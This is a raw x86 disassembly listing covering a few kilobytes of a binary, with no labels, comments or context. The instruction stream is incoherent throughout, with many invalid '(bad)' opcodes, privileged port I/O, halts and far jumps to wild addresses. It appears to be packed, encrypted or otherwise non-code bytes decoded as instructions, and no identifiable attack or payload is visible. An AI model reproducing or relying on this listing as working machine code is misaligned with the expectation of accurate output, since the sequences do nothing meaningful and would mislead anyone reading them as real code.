  4238ac:	or     eax,0x337e0cc0
  4238b1:	loope  0x423896
  4238b3:	xor    esi,edi
  4238b5:	mov    dl,0xd8
  4238b7:	dec    esi
  4238b8:	loopne 0x423865
  4238ba:	aas    
  4238bb:	aaa    
  4238bc:	lea    eax,es:[edi-0x2d59e1f0]
  4238c3:	cmp    eax,0x67ca04e1
  4238c8:	mov    edi,0x70bf531
  4238cd:	jae    0x42390b
  4238cf:	mov    ecx,0x7c982d4
  4238d4:	dec    edi
  4238d5:	std    
  4238d6:	or     edx,DWORD PTR [esi+0x52f6feff]
  4238dc:	leave  
  4238dd:	clc    
  4238de:	les    esp,FWORD PTR [ecx+ebx*8-0x57]
  4238e2:	sub    al,0xf
  4238e4:	mov    ah,0x12
  4238e6:	inc    ebx
  4238e7:	or     al,BYTE PTR [edx+0x3f852782]
  4238ed:	shr    BYTE PTR [ebx+ecx*4+0xd],cl
  4238f1:	retf   0xdac6
  4238f4:	jno    0x4238f1
  4238f6:	fisub  DWORD PTR [esi]
  4238f8:	and    al,0x6
  4238fa:	sub    esp,DWORD PTR [eax-0x7c]
  4238fd:	out    dx,eax
  4238fe:	jnp    0x4238c8
  423900:	mov    bh,0x43
  423902:	imul   ebx,DWORD PTR [edi+0x79ee2969],0x56
  423909:	retf   
  42390a:	ds adc ebp,ecx
  42390d:	je     0x423966
  42390f:	xor    bh,BYTE PTR [ebx]
  423911:	mov    ebx,DWORD PTR [edi+0x77]
  423914:	in     al,dx
  423915:	retf   0x13aa
  423918:	out    0xf,al
  42391a:	and    DWORD PTR [edx-0x4df2df66],ebp
  423920:	sub    al,0xcc
  423922:	mov    al,ds:0x72b2f52b
  423927:	int3   
  423928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423929:	pop    esp
  42392a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42392b:	(bad)  
  42392c:	iret   
  42392d:	jl     0x4239a2
  42392f:	jge    0x4238fa
  423931:	push   ebp
  423932:	jbe    0x423955
  423934:	addr16 mov ah,0x8e
  423937:	sbb    ecx,DWORD PTR [ebp+0x7c]
  42393a:	mov    ah,0x3a
  42393c:	fdivr  QWORD PTR [eax]
  42393e:	les    edi,FWORD PTR [ebp+0xece6ae9]
  423944:	inc    edi
  423945:	(bad)  
  423946:	pop    ds
  423947:	inc    edi
  423948:	jl     0x423902
  42394a:	dec    esp
  42394b:	int    0xf5
  42394d:	cmp    al,0xd9
  42394f:	pop    ecx
  423950:	icebp  
  423951:	(bad)  
  423952:	adc    BYTE PTR [ebp+0x75],bl
  423955:	mov    DWORD PTR [esi+eiz*8],esp
  423958:	js     0x423924
  42395a:	shr    BYTE PTR [edx],0xe1
  42395d:	lods   al,BYTE PTR ds:[esi]
  42395e:	inc    ecx
  42395f:	std    
  423960:	stos   BYTE PTR es:[edi],al
  423961:	pop    edi
  423962:	into   
  423963:	sub    ecx,DWORD PTR [ebx+0x56]
  423966:	test   DWORD PTR [eax+0x4a],esp
  423969:	int3   
  42396a:	mov    edi,0xd66ec3c8
  42396f:	dec    ebx
  423970:	sbb    al,0x80
  423972:	repz push eax
  423974:	or     al,0x71
  423976:	jg     0x423963
  423978:	scas   eax,DWORD PTR es:[edi]
  423979:	sbb    DWORD PTR [edi],eax
  42397b:	imul   edx,DWORD PTR [eax-0xf55e912],0x2
  423982:	sbb    al,0xf7
  423984:	mov    edx,0xf49c297
  423989:	or     ah,BYTE PTR [edi-0x6a63dbb8]
  42398f:	mov    ch,0xdc
  423991:	mov    dl,0x6e
  423993:	push   ds
  423994:	jbe    0x4239d2
  423996:	jne    0x423984
  423998:	xchg   BYTE PTR [esi],dh
  42399a:	fist   WORD PTR [esi+0x4a3beddd]
  4239a0:	cdq    
  4239a1:	push   0x6f1ce52
  4239a6:	jp     0x4239de
  4239a8:	cld    
  4239a9:	rcr    DWORD PTR ds:[ebx+0x41],0x30
  4239ae:	(bad)  
  4239af:	retf   0xfb11
  4239b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239b3:	dec    ebx
  4239b4:	jmp    0x98566290
  4239b9:	jbe    0x423a38
  4239bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239bc:	mov    edi,0x67038b46
  4239c1:	mov    eax,ds:0xb7bcde7c
  4239c6:	jns    0x4239e3
  4239c8:	cdq    
  4239c9:	add    eax,0x82dff53b
  4239ce:	stos   DWORD PTR es:[edi],eax
  4239cf:	in     eax,dx
  4239d0:	scas   eax,DWORD PTR es:[edi]
  4239d1:	scas   eax,DWORD PTR es:[edi]
  4239d2:	xchg   esp,eax
  4239d3:	loop   0x423a48
  4239d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239d6:	mov    ch,BYTE PTR ds:0x1a3bac89
  4239dc:	push   ds
  4239dd:	sub    DWORD PTR [ebp-0x5e],esi
  4239e0:	stos   DWORD PTR es:[edi],eax
  4239e1:	inc    ebp
  4239e2:	stc    
  4239e3:	mov    esi,0xedb3fbb4
  4239e8:	data16 into 
  4239ea:	xlat   BYTE PTR ds:[ebx]
  4239eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239ec:	call   0xbd59fefc
  4239f1:	fisttp WORD PTR [ecx+0x4d]
  4239f4:	bound  ecx,QWORD PTR [ebp+ecx*8-0x1f]
  4239f8:	and    DWORD PTR ds:0x442009f8,0x74
  4239ff:	xlat   BYTE PTR ds:[ebx]
  423a00:	mov    al,0x1e
  423a02:	jmp    0x9df838a1
  423a07:	cmp    DWORD PTR [eax-0x25],edi
  423a0a:	adc    esp,DWORD PTR [ebx]
  423a0c:	pop    ss
  423a0d:	out    0x53,al
  423a0f:	inc    edx
  423a10:	mov    bl,0xd6
  423a12:	mov    bh,0x5d
  423a14:	(bad)  
  423a15:	sbb    BYTE PTR [edx+0x5f],dl
  423a18:	mov    bl,0x98
  423a1a:	add    al,0xcb
  423a1c:	dec    ecx
  423a1d:	fucomp st(1)
  423a1f:	pop    edi
  423a20:	mov    esp,0xc52e02a2
  423a25:	int3   
  423a26:	test   al,0xa1
  423a28:	sub    BYTE PTR [ebx-0x4f],dh
  423a2b:	sbb    bl,BYTE PTR [edi-0x4c]
  423a2e:	sub    bh,bh
  423a30:	and    eax,edx
  423a32:	popa   
  423a33:	xor    DWORD PTR [ecx],0xee6e7816
  423a39:	xchg   ebx,ecx
  423a3b:	xchg   edi,esp
  423a3d:	xchg   ebx,eax
  423a3e:	mov    dl,BYTE PTR [ebp+ecx*4+0x39]
  423a42:	dec    ebx
  423a43:	scas   eax,DWORD PTR es:[edi]
  423a44:	sbb    BYTE PTR [ebx-0x6c],al
  423a47:	aas    
  423a48:	or     al,0x7
  423a4a:	(bad)  
  423a4c:	jge    0x4239ce
  423a4e:	in     eax,dx
  423a4f:	and    ecx,edx
  423a51:	std    
  423a52:	xchg   BYTE PTR [ebx+0x1df154d4],dl
  423a58:	out    0xe7,eax
  423a5a:	loopne 0x423ac8
  423a5c:	push   eax
  423a5d:	sub    eax,0x162f85d4
  423a62:	hlt    
  423a63:	push   eax
  423a64:	xor    DWORD PTR [ebx-0x23de1307],0xb7cc03d5
  423a6e:	mov    ds:0xc4dcb4e7,al
  423a73:	ja     0x423a48
  423a75:	mov    dh,0x77
  423a77:	inc    ebp
  423a78:	outs   dx,DWORD PTR ds:[esi]
  423a79:	push   ss
  423a7a:	gs and bl,cl
  423a7d:	mov    ds:0x2e803243,eax
  423a82:	sub    cl,bl
  423a84:	imul   DWORD PTR [esi]
  423a86:	xlat   BYTE PTR ds:[ebx]
  423a87:	inc    ebp
  423a88:	push   ds
  423a89:	mov    gs:0xc5fa38f5,al
  423a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a90:	jns    0x423a98
  423a92:	mov    dh,0xa5
  423a94:	fisttp DWORD PTR [eax-0x2254f7b3]
  423a9a:	or     dl,dl
  423a9c:	sbb    ch,BYTE PTR [ebx+0x151036e8]
  423aa2:	(bad)  
  423aa3:	adc    DWORD PTR [ecx+0x71],edi
  423aa6:	pop    edx
  423aa7:	es mov cl,0xe1
  423aaa:	xlat   BYTE PTR ds:[ebx]
  423aab:	ja     0x423ad1
  423aad:	loope  0x423ac3
  423aaf:	add    edi,DWORD PTR ds:0xe73ac0e0
  423ab5:	add    al,0x59
  423ab7:	ss retf 0x91d4
  423abb:	pusha  
  423abc:	pop    esp
  423abd:	inc    esp
  423abe:	adc    eax,0x21cd4525
  423ac3:	mov    ch,0x5b
  423ac5:	adc    ah,BYTE PTR gs:[eax]
  423ac8:	xchg   ecx,eax
  423ac9:	push   ebp
  423aca:	int3   
  423acb:	and    al,0x28
  423acd:	cmp    al,0x3e
  423acf:	imul   ebx,ecx,0xffffff93
  423ad2:	add    al,0x3d
  423ad4:	and    ah,BYTE PTR [eax+0x2a]
  423ad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ad8:	jae    0x423aac
  423ada:	rcl    DWORD PTR [ebx-0x4562928b],1
  423ae0:	or     dl,BYTE PTR [ebp+0x58]
  423ae3:	rol    DWORD PTR [ebx-0x2373e182],cl
  423ae9:	sbb    al,dl
  423aeb:	xchg   DWORD PTR [eax-0x43],esi
  423aee:	xchg   ecx,eax
  423aef:	(bad)  
  423af0:	das    
  423af1:	fld    QWORD PTR [ebx+0x63]
  423af4:	ss jno 0x423ac3
  423af7:	jno    0x423ab6
  423af9:	jbe    0x423b65
  423afb:	mov    dl,0xb5
  423afd:	cmp    dh,BYTE PTR [ebp+ecx*2+0x65]
  423b01:	nop
  423b02:	fimul  DWORD PTR ds:0xcde76a92
  423b08:	and    DWORD PTR [ebx-0x6a99909d],ebp
  423b0e:	cmp    ch,0x3d
  423b11:	cs or  eax,0xffffffc1
  423b15:	add    al,0x32
  423b17:	xchg   eax,edx
  423b19:	nop
  423b1a:	fwait
  423b1b:	cwde   
  423b1c:	lea    edi,[esi]
  423b1e:	imul   edx,DWORD PTR [ecx+edx*8],0x52
  423b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b23:	sar    ecx,0x1c
  423b26:	lea    ebx,[ebp-0x1470acad]
  423b2c:	sub    DWORD PTR [ebp+0x49f524ca],edx
  423b32:	mov    ds:0xf8a6391d,al
  423b37:	and    ebx,DWORD PTR [ebp+0x7a205b3e]
  423b3d:	je     0x423bbd
  423b3f:	rcr    DWORD PTR [esi-0x18b32052],0x54
  423b46:	push   edi
  423b47:	das    
  423b48:	in     al,dx
  423b49:	fdivr  QWORD PTR [ebx+0x5f9bede1]
  423b4f:	ror    ecx,1
  423b51:	(bad)  
  423b53:	xchg   ebp,eax
  423b54:	lahf   
  423b55:	pop    eax
  423b56:	popa   
  423b57:	cmp    DWORD PTR [edx],esp
  423b59:	mov    BYTE PTR [edx],bl
  423b5b:	inc    ebp
  423b5c:	loope  0x423bb6
  423b5e:	mov    ah,0xf0
  423b60:	scas   eax,DWORD PTR es:[edi]
  423b61:	mov    ds:0x4381b559,eax
  423b66:	ins    DWORD PTR es:[edi],dx
  423b67:	lods   eax,DWORD PTR ds:[esi]
  423b68:	mov    eax,0xef03ed31
  423b6d:	mov    ecx,0x791eb98
  423b72:	pop    ds
  423b73:	mov    dl,0x77
  423b75:	jbe    0x423bdb
  423b77:	sbb    edi,esp
  423b79:	leave  
  423b7a:	dec    ecx
  423b7b:	fcom   QWORD PTR [ebx]
  423b7d:	test   ah,dl
  423b7f:	pop    edi
  423b80:	out    dx,eax
  423b81:	cli    
  423b82:	retf   
  423b83:	fcomp  QWORD PTR [ebx-0x2b]
  423b86:	shl    edi,0xd
  423b89:	xchg   esp,eax
  423b8a:	jmp    0xaed9e6cb
  423b8f:	sar    DWORD PTR [ebp-0x54],0xfb
  423b93:	xchg   edi,eax
  423b94:	aaa    
  423b95:	ins    DWORD PTR es:[edi],dx
  423b96:	add    bl,BYTE PTR [ebx+0x1482ba1f]
  423b9c:	sub    BYTE PTR [edi-0x1b],bh
  423b9f:	and    al,0x48
  423ba1:	mov    dl,0xfa
  423ba3:	scas   al,BYTE PTR es:[edi]
  423ba4:	popf   
  423ba5:	sbb    al,0x7f
  423ba7:	popf   
  423ba8:	mov    ds:0x9dc66488,eax
  423bad:	cld    
  423bae:	adc    eax,0x5406d035
  423bb3:	adc    edx,0x6d44d6ea
  423bb9:	and    DWORD PTR [edi+0x4ad06b35],0x3d88318c
  423bc3:	mov    dh,ch
  423bc5:	jmp    0x423b84
  423bc7:	int    0xfa
  423bc9:	mov    ds:0x4ae138c3,eax
  423bce:	mov    edx,0x26e2e36f
  423bd3:	push   es
  423bd4:	fadd   st(3),st
  423bd6:	je     0x423c4a
  423bd8:	cmp    DWORD PTR [ecx],ebx
  423bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bdb:	lea    esp,[edx+ebp*4-0x59145992]
  423be2:	ins    DWORD PTR es:[edi],dx
  423be3:	cli    
  423be4:	adc    esi,DWORD PTR [ebx+0x5f]
  423be7:	dec    esi
  423be8:	pop    ebx
  423be9:	out    dx,eax
  423bea:	sub    eax,0x1801a6b8
  423bef:	out    dx,eax
  423bf0:	ret    
  423bf1:	inc    ecx
  423bf2:	in     al,dx
  423bf3:	or     BYTE PTR [eax+0x4cdb1728],cl
  423bf9:	and    BYTE PTR [ebx],bh
  423bfb:	inc    esp
  423bfc:	or     ch,BYTE PTR cs:[ebx+0x61]
  423c00:	mov    ah,0xfa
  423c02:	add    edx,esp
  423c04:	mov    ebp,0x438e8069
  423c09:	lahf   
  423c0a:	jbe    0x423bfc
  423c0c:	xor    eax,0x5b74fe33
  423c11:	adc    dh,BYTE PTR [ecx+0x11]
  423c14:	jl     0x423bac
  423c16:	rcl    DWORD PTR [esp+eiz*2-0x13007902],cl
  423c1d:	add    ah,dl
  423c1f:	pushf  
  423c20:	leave  
  423c21:	mov    edx,0x9c7d3296
  423c26:	sub    DWORD PTR [ebx-0x34],ecx
  423c29:	pop    edx
  423c2a:	xor    BYTE PTR [ebx-0x3778c674],ch
  423c30:	js     0x423c6c
  423c32:	icebp  
  423c33:	dec    ecx
  423c34:	or     eax,0x31ca2ca
  423c39:	test   al,0x9c
  423c3b:	inc    edx
  423c3c:	dec    esp
  423c3d:	fild   DWORD PTR [ecx-0x67f63c3e]
  423c43:	outs   dx,BYTE PTR ds:[esi]
  423c44:	fbstp  TBYTE PTR [ebx]
  423c46:	pop    eax
  423c47:	push   edi
  423c48:	sub    ebp,0xfa9ec16
  423c4e:	mov    ebp,DWORD PTR [edx-0x38]
  423c51:	jb     0x423c67
  423c53:	sub    cl,al
  423c55:	pop    ss
  423c56:	adc    DWORD PTR [ebx+0x34242249],0x1b858b75
  423c60:	lds    esi,FWORD PTR ss:[edx-0x29aa90de]
  423c67:	jb     0x423c50
  423c69:	repnz sbb al,0xd4
  423c6c:	inc    ebp
  423c6d:	dec    ebp
  423c6e:	hlt    
  423c6f:	jl     0x423c6e
  423c71:	dec    ebp
  423c72:	mov    BYTE PTR ds:0x7686,cl
  423c77:	test   DWORD PTR [edx+0x7e7bc84a],edi
  423c7d:	jp     0x423c79
  423c7f:	(bad)
  423c84:	mov    cl,0x5c
  423c86:	retf   
  423c87:	aas    
  423c88:	pop    ebp
  423c89:	out    dx,al
  423c8a:	(bad)  
  423c8b:	fldcw  WORD PTR [ecx+0x4b6da238]
  423c91:	pusha  
  423c92:	add    DWORD PTR [edi+0x61aa7012],edx
  423c98:	addr16 dec edx
  423c9a:	mov    cl,0x9a
  423c9c:	in     eax,dx
  423c9d:	and    eax,0x968b820
  423ca2:	rcl    BYTE PTR [esi],1
  423ca4:	(bad)  
  423ca5:	cmp    al,BYTE PTR [ebx-0x70df53]
  423cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cac:	xor    DWORD PTR [edx-0x33],esi
  423caf:	sti    
  423cb0:	out    0x6,eax
  423cb2:	ud0    ebp,DWORD PTR [edx]
  423cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cb6:	ret    
  423cb7:	mov    ebx,0x4c79ea6d
  423cbc:	les    ebx,FWORD PTR [eax+ecx*4]
  423cbf:	xchg   edx,eax
  423cc0:	lahf   
  423cc1:	push   esp
  423cc2:	add    DWORD PTR [edi-0x39e3c357],ebp
  423cc8:	js     0x423c7e
  423cca:	mov    ebx,0xc52814b0
  423ccf:	jmp    0x423cfa
  423cd1:	jmp    0x5336:0xac2f571c
  423cd8:	xchg   esp,eax
  423cd9:	pop    edi
  423cda:	pop    ss
  423cdb:	std    
  423cdc:	ins    DWORD PTR es:[edi],dx
  423cdd:	scas   eax,DWORD PTR es:[edi]
  423cde:	inc    esi
  423cdf:	rol    bh,cl
  423ce1:	push   esi
  423ce2:	mov    eax,0x8b67d775
  423ce7:	rol    esi,cl
  423ce9:	fcmove st,st(6)
  423ceb:	out    dx,al
  423cec:	fcom   QWORD PTR [ebp+ecx*8+0x48012db1]
  423cf3:	jl     0x423d0c
  423cf5:	je     0x423d46
  423cf7:	mov    bh,0x90
  423cf9:	rcr    DWORD PTR [edx+0x38],0x95
  423cfd:	sbb    eax,0xc748013
  423d02:	ret    0xdf78
  423d05:	mov    al,0x81
  423d07:	das    
  423d08:	sub    ah,BYTE PTR [ecx+0x5b]
  423d0b:	mov    bl,BYTE PTR [edx-0x50bcc636]
  423d11:	or     DWORD PTR [ebp+0x32],ebp
  423d14:	dec    ecx
  423d15:	xor    al,BYTE PTR [edx]
  423d17:	add    eax,0x3eb7472c
  423d1c:	das    
  423d1d:	cmp    al,0xed
  423d1f:	xchg   ebp,eax
  423d20:	loop   0x423cc5
  423d22:	pop    ebp
  423d23:	pusha  
  423d24:	adc    ebx,DWORD PTR [ecx+0x4e2958dd]
  423d2a:	sub    edx,ebx
  423d2c:	push   edi
  423d2d:	jl     0x423cdd
  423d2f:	dec    ebp
  423d30:	clc    
  423d31:	dec    ebx
  423d32:	mov    BYTE PTR [esi],0xa1
  423d35:	dec    eax
  423d36:	jo     0x423d70
  423d38:	xlat   BYTE PTR ds:[ebx]
  423d39:	xor    al,0x5a
  423d3b:	push   ecx
  423d3c:	into   
  423d3d:	mov    ebx,0xe0417f17
  423d42:	jns    0x423cd3
  423d44:	sahf   
  423d45:	add    bh,bl
  423d47:	test   ebp,0x60a57b27
  423d4d:	jl     0x423d97
  423d4f:	int3   
  423d50:	bound  esp,QWORD PTR [ebx]
  423d52:	shl    DWORD PTR [ebx+0xabdac2a],1
  423d58:	nop
  423d59:	dec    ebp
  423d5a:	xor    ch,BYTE PTR [esi-0x26f568af]
  423d60:	or     DWORD PTR [ecx],edi
  423d62:	sub    al,0x64
  423d64:	inc    ebp
  423d65:	xor    edi,edi
  423d67:	cs mov dl,0xd0
  423d6a:	mov    cl,0x35
  423d6c:	pop    ds
  423d6d:	push   es
  423d6e:	pop    es
  423d6f:	inc    esi
  423d70:	(bad)  
  423d71:	push   edx
  423d72:	aam    0xdc
  423d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d75:	fsubr  DWORD PTR [edi+esi*4-0x4c]
  423d79:	pop    ebx
  423d7a:	js     0x423d82
  423d7c:	jmp    0x423dae
  423d7e:	push   edi
  423d7f:	fyl2x  
  423d81:	push   0x4b7fe4d9
  423d86:	xor    DWORD PTR [eax+edi*1+0x2b72a8e2],edi
  423d8d:	out    dx,eax
  423d8e:	xor    bh,BYTE PTR [edi+0x2c629781]
  423d94:	add    eax,0x499f54ae
  423d99:	jle    0x423dc3
  423d9b:	jo     0x423da9
  423d9d:	jne    0x423da9
  423d9f:	jl     0x423d28
  423da1:	sbb    eax,0x9755f045
  423da6:	arpl   WORD PTR [eax],sp
  423da8:	pop    ebx
  423da9:	mov    bh,0xd7
  423dab:	retf   0xfa37
  423dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423daf:	ret    
  423db0:	sub    BYTE PTR [ecx+0x7d],bl
  423db3:	std    
  423db4:	leave  
  423db5:	inc    esp
  423db6:	je     0x423e26
  423db8:	push   ebx
  423db9:	loope  0x423d79
  423dbb:	jbe    0x423d9e
  423dbd:	xchg   edx,eax
  423dbe:	sahf   
  423dbf:	and    al,0x9f
  423dc1:	push   ecx
  423dc2:	adc    edi,DWORD PTR [edx-0x1c]
  423dc5:	(bad)  
  423dc6:	(bad)  
  423dc7:	cmp    eax,0x4ab767ce
  423dcc:	push   es
  423dcd:	popa   
  423dce:	jg     0x423e3d
  423dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dd1:	rcr    DWORD PTR [edx+0x65],0x3c
  423dd5:	mov    eax,0x1fb6745d
  423dda:	aas    
  423ddb:	xchg   ebp,eax
  423ddc:	mov    esp,0x9efd3d2a
  423de1:	jmp    0x423d8c
  423de3:	mov    edx,esi
  423de5:	popa   
  423de6:	cwde   
  423de7:	jbe    0x423e10
  423de9:	mov    ecx,0xeee66015
  423dee:	les    ebp,FWORD PTR gs:[ecx+0xe3777ff]
  423df5:	test   al,0xbe
  423df7:	sbb    DWORD PTR ds:0x63f6c14,0x5
  423dfe:	mov    ebp,DWORD PTR [ecx]
  423e00:	add    eax,0x41b9366e
  423e05:	arpl   bx,di
  423e07:	lahf   
  423e08:	push   ss
  423e09:	mov    edi,DWORD PTR [edx]
  423e0b:	jnp    0x423de3
  423e0d:	jne    0x423e70
  423e0f:	ja     0x423e13
  423e11:	(bad)  
  423e12:	push   esp
  423e13:	jmp    0xc280:0xec164597
  423e1a:	in     al,0x87
  423e1c:	fcmovnb st,st(7)
  423e1e:	repnz out 0xae,eax
  423e21:	xor    edx,esp
  423e23:	inc    ecx
  423e24:	bound  ebx,QWORD PTR [ecx-0x30]
  423e27:	mov    al,BYTE PTR [eax-0x62]
  423e2a:	shl    DWORD PTR [eax],1
  423e2c:	xchg   esi,eax
  423e2d:	sbb    ebp,DWORD PTR [edi-0xc9f60f7]
  423e33:	cmp    ebx,ebp
  423e35:	(bad)  
  423e36:	in     eax,dx
  423e37:	and    al,0x90
  423e39:	stos   DWORD PTR es:[edi],eax
  423e3a:	dec    esi
  423e3b:	aam    0x29
  423e3d:	dec    ecx
  423e3e:	cdq    
  423e3f:	enter  0x48a6,0x56
  423e43:	arpl   WORD PTR [esp+ecx*4],si
  423e46:	jns    0x423e8b
  423e48:	jle    0x423df5
  423e4a:	adc    eax,0x287a723d
  423e4f:	faddp  st(3),st
  423e51:	and    DWORD PTR [eax-0x33],ebx
  423e54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e55:	push   esi
  423e56:	or     eax,edi
  423e58:	sub    eax,0xa4b1ebad
  423e5d:	inc    ebp
  423e5e:	jmp    0xb4ee4c57
  423e63:	xchg   edx,eax
  423e64:	dec    edx
  423e65:	popa   
  423e66:	xchg   ecx,eax
  423e67:	shl    ebx,1
  423e69:	jl     0x423ebd
  423e6b:	call   0xd92d656a
  423e70:	sub    BYTE PTR [ebx+0x39],dl
  423e73:	xchg   edx,eax
  423e74:	dec    ebp
  423e75:	imul   edx,DWORD PTR [ebx],0x6a
  423e78:	dec    eax
  423e79:	dec    esp
  423e7a:	sahf   
  423e7b:	mov    ds,WORD PTR [edx+0x6ef2d9fb]
  423e81:	imul   edi,DWORD PTR [esi-0x79daa19a],0xb599743d
  423e8b:	jge    0x423ef7
  423e8d:	jno    0x423e12
  423e8f:	daa    
  423e90:	and    edi,DWORD PTR [edi+0x5dedccf6]
  423e96:	js     0x423ef2
  423e98:	aad    0x76
  423e9a:	(bad)  
  423e9b:	hlt    
  423e9c:	div    DWORD PTR ds:0x6f2501e2
  423ea2:	push   cs
  423ea3:	sbb    al,0x9f
  423ea5:	loop   0x423e93
  423ea7:	jo     0x423e8c
  423ea9:	jle    0x423e4f
  423eab:	ja     0x423e2f
  423ead:	adc    cl,BYTE PTR [edx-0x5a]
  423eb0:	sbb    ecx,DWORD PTR [edx]
  423eb2:	and    DWORD PTR ds:[edi],ebx
  423eb5:	xor    BYTE PTR [eax-0x6e49118b],0x65
  423ebc:	fstp   TBYTE PTR [eax+edi*4-0x53]
  423ec0:	in     al,dx
  423ec1:	aaa    
  423ec2:	ror    BYTE PTR [eax+0x41d9efeb],1
  423ec8:	mov    DWORD PTR [edi+0x1c35994b],ebx
  423ece:	ret    0x7f60
  423ed1:	(bad)  
  423ed2:	jg     0x423efa
  423ed4:	sub    ah,dh
  423ed6:	mov    cl,0x25
  423ed8:	fbstp  TBYTE PTR [edi-0x1c123b2c]
  423ede:	mov    al,ds:0x33fae3e7
  423ee3:	xchg   BYTE PTR [ebx+ebx*1+0x54],bl
  423ee7:	inc    ecx
  423ee8:	ror    ecx,0x70
  423eeb:	inc    BYTE PTR [edi+esi*4+0x3d]
  423eef:	mov    al,0x2
  423ef1:	push   edx
  423ef2:	mov    ebp,0xe2653d4
  423ef7:	(bad)  
  423ef8:	adc    al,0xcf
  423efa:	sbb    ebx,edx
  423efc:	lahf   
  423efd:	inc    edx
  423efe:	push   ebp
  423eff:	inc    ecx
  423f00:	inc    ebp
  423f01:	out    dx,eax
  423f02:	and    ecx,DWORD PTR [ebx-0x5a]
  423f05:	fdiv   DWORD PTR [edi+0x666ca2ac]
  423f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f0c:	push   si
  423f0e:	inc    eax
  423f0f:	fiadd  DWORD PTR [ebx+0x2c]
  423f12:	pop    eax
  423f13:	mov    al,ds:0x105d1ecb
  423f18:	gs cmp al,0xef
  423f1b:	(bad)  
  423f1c:	adc    al,0x25
  423f1e:	scas   al,BYTE PTR es:[edi]
  423f1f:	in     eax,dx
  423f20:	je     0x423ee4
  423f22:	sbb    al,0x90
  423f24:	ret    
  423f25:	adc    ebp,DWORD PTR [ebx]
  423f27:	push   eax
  423f28:	js     0x423eac
  423f2a:	adc    BYTE PTR [eax],al
  423f2c:	sub    BYTE PTR [esi-0x48],bl
  423f2f:	aaa    
  423f30:	xchg   esi,eax
  423f31:	jns    0x423f57
  423f33:	les    ebx,FWORD PTR [ecx]
  423f35:	adc    eax,0x55a0e153
  423f3a:	mov    dh,0x8d
  423f3c:	mov    dl,0xa1
  423f3e:	push   ebp
  423f3f:	mov    cl,0xc7
  423f41:	test   DWORD PTR [ecx],edx
  423f43:	xor    BYTE PTR [ecx],dl
  423f45:	mov    ds:0x6dc6108d,al
  423f4a:	dec    ebx
  423f4b:	dec    ecx
  423f4c:	push   ss
  423f4d:	mov    eax,ds:0x68aaa5ce
  423f52:	push   ebx
  423f53:	xor    al,0x13
  423f55:	xor    ebp,DWORD PTR [ecx]
  423f57:	bound  esp,QWORD PTR [eax]
  423f59:	ja     0x423fbd
  423f5b:	mov    ch,0x41
  423f5d:	mov    edx,DWORD PTR [esi+ebp*8+0x8]
  423f61:	call   DWORD PTR [eax]
  423f63:	sar    BYTE PTR [ebp+0x48cc1804],0xca
  423f6a:	mov    ebp,DWORD PTR [eax]
  423f6c:	ret    
  423f6d:	ret    0xf7c6
  423f70:	aad    0xf6
  423f72:	dec    esi
  423f73:	jp     0x423f41
  423f75:	jmp    0xf5f7:0xbcb18ad0
  423f7c:	fcmovb st,st(0)
  423f7e:	jbe    0x423f63
  423f80:	dec    ebp
  423f81:	add    ebp,esi
  423f83:	jp     0x423f2a
  423f85:	xchg   ebx,eax
  423f86:	jo     0x424002
  423f88:	cmp    BYTE PTR [ebx+ebp*4+0x1188372],0x8a
  423f90:	out    dx,al
  423f91:	pop    es
  423f92:	loope  0x423fe0
  423f94:	adc    al,0xd7
  423f96:	adc    DWORD PTR [esi-0x32a34287],ebp
  423f9c:	pop    ebp
  423f9d:	add    esp,DWORD PTR [esi+0x75]
  423fa0:	das    
  423fa1:	inc    eax
  423fa2:	mov    ebx,DWORD PTR [eax]
  423fa4:	xor    ecx,DWORD PTR ds:0xdf31bf01
  423faa:	xchg   ecx,eax
  423fab:	loopne 0x424024
  423fad:	sub    DWORD PTR [edi-0x61],ebp
  423fb0:	xchg   DWORD PTR [eax],edx
  423fb2:	fdiv   st,st(2)
  423fb4:	mov    eax,ds:0xf750b182
  423fb9:	mov    ds:0x7bcd54bf,al
  423fbe:	pusha  
  423fbf:	xchg   ebx,eax
  423fc0:	mov    cl,0x80
  423fc2:	add    ah,BYTE PTR [edx-0x20c580d]
  423fc8:	fwait
  423fc9:	pop    ecx
  423fca:	shl    DWORD PTR [eax-0xc6c4494],cl
  423fd0:	hlt    
  423fd1:	shl    BYTE PTR [edx-0x80],1
  423fd4:	(bad)  
  423fd5:	repz inc edx
  423fd7:	outs   dx,BYTE PTR ds:[esi]
  423fd8:	pop    esi
  423fd9:	add    BYTE PTR [ebp+0x76b6bf97],dl
  423fdf:	sti    
  423fe0:	lea    ecx,[ecx]
  423fe2:	in     al,0x2
  423fe4:	fild   DWORD PTR [esi+0x2f0ab1ab]
  423fea:	or     eax,0x186b4791
  423fef:	pop    esp
  423ff0:	es call 0xfe489e5f
  423ff6:	xor    al,0x55
  423ff8:	add    edi,DWORD PTR [ebx]
  423ffa:	sub    al,0x45
  423ffc:	in     al,dx
  423ffd:	mov    ebx,0xfe70ff2e
  424002:	push   ss
  424003:	add    DWORD PTR [edi+ecx*2],esi
  424006:	gs arpl dx,sp
  424009:	add    DWORD PTR [edx],ecx
  42400b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42400c:	or     bl,BYTE PTR [edx+0x724d430c]
  424012:	(bad)  
  424013:	jecxz  0x424049
  424015:	and    DWORD PTR [edi-0x4fe7bbd9],edi
  42401b:	sub    edi,DWORD PTR [eax-0x60f96463]
  424021:	loop   0x42404f
  424023:	sub    edi,DWORD PTR [edi]
  424025:	pop    es
  424026:	mov    ecx,0x1601eca6
  42402b:	mov    ebx,ebx
